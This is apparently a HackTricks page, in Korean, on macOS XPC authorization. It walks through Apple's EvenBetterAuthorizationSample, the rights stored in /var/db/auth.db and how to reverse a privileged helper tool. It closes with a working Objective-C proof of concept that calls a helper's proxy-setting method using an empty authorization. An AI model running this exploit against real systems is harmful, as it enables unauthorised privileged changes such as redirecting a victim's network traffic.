# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple은 연결된 프로세스가 **노출된 XPC 메서드를 호출할 수 있는 권한이 있는지** 인증하는 또 다른 방법을 제안합니다.

응용 프로그램이 **특권 사용자로서 작업을 실행해야 할 때**, 일반적으로 특권 사용자로 앱을 실행하는 대신, 해당 작업을 수행하기 위해 앱에서 호출할 수 있는 XPC 서비스로서 HelperTool을 루트로 설치합니다. 그러나 서비스를 호출하는 앱은 충분한 권한을 가져야 합니다.

### ShouldAcceptNewConnection 항상 YES

예시는 [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)에서 찾을 수 있습니다. `App/AppDelegate.m`에서 **HelperTool**에 **연결**하려고 시도합니다. 그리고 `HelperTool/HelperTool.m`에서 함수 **`shouldAcceptNewConnection`**은 이전에 언급된 요구 사항을 **확인하지 않습니다**. 항상 YES를 반환합니다:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
더 많은 정보는 이 체크를 올바르게 구성하는 방법에 대해 확인하세요:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### 애플리케이션 권한

그러나 **HelperTool의 메서드가 호출될 때 일부 권한 부여가 발생합니다**.

`App/AppDelegate.m`의 **`applicationDidFinishLaunching`** 함수는 앱이 시작된 후 빈 권한 참조를 생성합니다. 이는 항상 작동해야 합니다.\
그런 다음, `setupAuthorizationRights`를 호출하여 해당 권한 참조에 **일부 권한을 추가하려고 시도합니다**:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m`의 `setupAuthorizationRights` 함수는 애플리케이션의 권한을 `/var/db/auth.db` 인증 데이터베이스에 저장합니다. 데이터베이스에 아직 없는 권한만 추가된다는 점에 유의하세요:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
함수 `enumerateRightsUsingBlock`는 `commandInfo`에 정의된 애플리케이션 권한을 가져오는 데 사용됩니다:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
이 프로세스의 끝에서 `commandInfo` 내에 선언된 권한은 `/var/db/auth.db`에 저장됩니다. 여기에서 **각 방법**에 대해 **인증이 필요**하고, **권한 이름** 및 **`kCommandKeyAuthRightDefault`**를 찾을 수 있습니다. 후자는 **누가 이 권한을 얻을 수 있는지를 나타냅니다**.

권한에 접근할 수 있는 사람을 나타내기 위한 다양한 범위가 있습니다. 그 중 일부는 [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)에서 정의되어 있으며 (여기에서 [모두 찾을 수 있습니다](https://www.dssw.co.uk/reference/authorization-rights/)), 요약하면:

<table><thead><tr><th width="284.3333333333333">이름</th><th width="165">값</th><th>설명</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>모두</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>아무도</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>현재 사용자는 관리자여야 합니다 (관리자 그룹 내)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>사용자에게 인증을 요청합니다.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>사용자에게 인증을 요청합니다. 그는 관리자여야 합니다 (관리자 그룹 내)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>규칙을 지정합니다</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>권한에 대한 추가 주석을 지정합니다</td></tr></tbody></table>

### 권한 검증

`HelperTool/HelperTool.m`에서 **`readLicenseKeyAuthorization`** 함수는 호출자가 **해당 방법을 실행할 수 있는 권한이 있는지** 확인하기 위해 **`checkAuthorization`** 함수를 호출합니다. 이 함수는 호출 프로세스에서 전송된 **authData**가 **올바른 형식**인지 확인한 다음, 특정 방법을 호출하기 위해 **권한을 얻기 위해 필요한 것**을 확인합니다. 모든 것이 잘 진행되면 **반환된 `error`는 `nil`이 됩니다**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
다음과 같이 **해당 메서드를 호출할 권한을 확인하기 위해** 함수 `authorizationRightForCommand`는 이전에 주석 처리된 객체 **`commandInfo`**를 확인합니다. 그런 다음 **`AuthorizationCopyRights`**를 호출하여 **함수를 호출할 권한이 있는지** 확인합니다(플래그가 사용자와의 상호작용을 허용한다는 점에 유의하십시오).

이 경우, 함수 `readLicenseKeyAuthorization`를 호출하기 위해 `kCommandKeyAuthRightDefault`는 `@kAuthorizationRuleClassAllow`로 정의됩니다. 따라서 **누구나 호출할 수 있습니다**.

### DB 정보

이 정보는 `/var/db/auth.db`에 저장된다고 언급되었습니다. 저장된 모든 규칙을 나열하려면:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
그럼, 다음을 통해 권한에 접근할 수 있는 사람을 확인할 수 있습니다:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 허용 권한

**모든 권한 구성** [**여기에서**](https://www.dssw.co.uk/reference/authorization-rights/) 찾을 수 있지만, 사용자 상호작용이 필요하지 않은 조합은 다음과 같습니다:

1. **'authenticate-user': 'false'**
- 이것은 가장 직접적인 키입니다. `false`로 설정하면 사용자가 이 권한을 얻기 위해 인증을 제공할 필요가 없음을 지정합니다.
- 이는 아래의 2개 중 하나와 조합하여 사용되거나 사용자가 속해야 하는 그룹을 나타내는 데 사용됩니다.
2. **'allow-root': 'true'**
- 사용자가 루트 사용자로 작동하고(권한이 상승된 상태), 이 키가 `true`로 설정되면 루트 사용자가 추가 인증 없이 이 권한을 얻을 수 있습니다. 그러나 일반적으로 루트 사용자 상태에 도달하려면 이미 인증이 필요하므로 대부분의 사용자에게는 "인증 없음" 시나리오가 아닙니다.
3. **'session-owner': 'true'**
- `true`로 설정되면 세션의 소유자(현재 로그인한 사용자)가 자동으로 이 권한을 얻습니다. 사용자가 이미 로그인한 경우 추가 인증을 우회할 수 있습니다.
4. **'shared': 'true'**
- 이 키는 인증 없이 권한을 부여하지 않습니다. 대신, `true`로 설정되면 권한이 인증된 후 여러 프로세스 간에 공유될 수 있으며 각 프로세스가 다시 인증할 필요가 없습니다. 그러나 권한의 초기 부여는 여전히 인증이 필요하며, `'authenticate-user': 'false'`와 같은 다른 키와 결합되지 않는 한 그렇습니다.

[**이 스크립트**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)를 사용하여 흥미로운 권한을 얻을 수 있습니다:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## 권한 역설정

### EvenBetterAuthorization 사용 여부 확인

**`[HelperTool checkAuthorization:command:]`** 함수를 찾으면, 아마도 이 프로세스는 이전에 언급된 권한 부여 스키마를 사용하고 있을 것입니다:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

이 함수가 `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`와 같은 함수를 호출하고 있다면, [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154)을 사용하고 있는 것입니다.

**`/var/db/auth.db`**를 확인하여 사용자 상호작용 없이 일부 권한 있는 작업을 호출할 수 있는지 확인하십시오.

### 프로토콜 통신

그런 다음, XPC 서비스와 통신을 설정할 수 있도록 프로토콜 스키마를 찾아야 합니다.

**`shouldAcceptNewConnection`** 함수는 내보내는 프로토콜을 나타냅니다:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

이 경우, EvenBetterAuthorizationSample과 동일하며, [**이 줄을 확인하십시오**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

사용된 프로토콜의 이름을 알면, **헤더 정의를 덤프할 수 있습니다**:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
마지막으로, 통신을 설정하기 위해 **노출된 Mach 서비스의 이름**을 알아야 합니다. 이를 찾는 방법은 여러 가지가 있습니다:

- **`[HelperTool init]`**에서 사용 중인 Mach 서비스를 확인할 수 있습니다:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist에서:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

이 예제에서는 다음이 생성됩니다:

- 함수가 포함된 프로토콜의 정의
- 접근 요청을 위해 사용할 빈 인증
- XPC 서비스에 대한 연결
- 연결이 성공했는지 확인하기 위한 함수 호출
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 다른 XPC 권한 헬퍼 남용

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## 참고문헌

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)

{{#include ../../../../../banners/hacktricks-training.md}}
